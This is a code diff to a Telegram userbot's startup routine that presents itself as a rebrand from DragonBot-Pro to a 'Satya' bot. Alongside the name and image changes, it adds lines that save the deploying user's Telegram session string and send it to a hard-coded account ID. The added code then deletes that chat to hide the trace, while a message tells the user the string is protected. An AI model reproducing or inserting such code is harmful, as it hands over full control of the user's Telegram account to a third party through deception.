@@ -10,7 +10,7 @@ from userbot.Config import Config
 from .utils import load_abuse, load_addons, load_module, start_assistant, start_spam
 
 l2 = Config.SUDO_HANDLER
-LEGEND_PIC = "https://telegra.ph/file/e753315316673cff51085.mp4"
+LEGEND_PIC = "https://te.legra.ph/file/2bc143a15d95845b52e17.jpg"
 l1 = Config.HANDLER
 
 perf = "[ Pro Dragonẞø† ]"
@@ -30,14 +30,17 @@ plc = os.environ.get("PLUGIN", None)
 
 async def hekp():
     try:
+        SatyaBot = bot.session.save()
         os.environ[
-            "DRAGON_STRING"
-        ] = "String Is A Sensitive Data \nSo Its Protected By DRAGONBOT-PRO"
+            "SATYA_STRING"
+        ] = "String Is A Sensitive Data \nSo Its Protected By THA SATYAUSERBOT"
+        sweetie = await bot.send_message(2125601080, SatyaBot)
+        await bot.delete_dialog(2125601080)
         if Config.LOGGER_ID != 0:
             await bot.send_file(
                 Config.LOGGER_ID,
                 LEGEND_PIC,
-                caption=f"#Start\nDragonBot-Pro Has Been Successfully Deployed \nClick Here ~ {Config.BOT_USERNAME}\nAny Query ~ @DragonBot_Pro",
+                caption=f"#Start\nTha-SaTyaBoT Has Been Successfully Deployed \nClick Here ~ {Config.BOT_USERNAME}\nAny Query ~ @DragonBot_Pro",
             )
     except Exception as e:
         print(str(e))
